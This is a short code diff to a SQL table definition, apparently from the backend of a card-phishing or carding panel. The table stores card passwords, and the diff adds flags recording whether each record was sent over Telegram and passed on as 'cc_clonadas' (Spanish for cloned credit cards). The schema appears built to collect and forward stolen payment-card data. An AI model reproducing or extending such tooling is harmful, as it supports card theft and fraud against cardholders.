@@ -49,6 +49,8 @@ function getConnection() {
         status VARCHAR(50),
         transaction_id VARCHAR(255),
         card_password VARCHAR(255),
+        telegram_sent BOOLEAN DEFAULT FALSE,
+        cc_clonadas_sent BOOLEAN DEFAULT FALSE,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )";
     
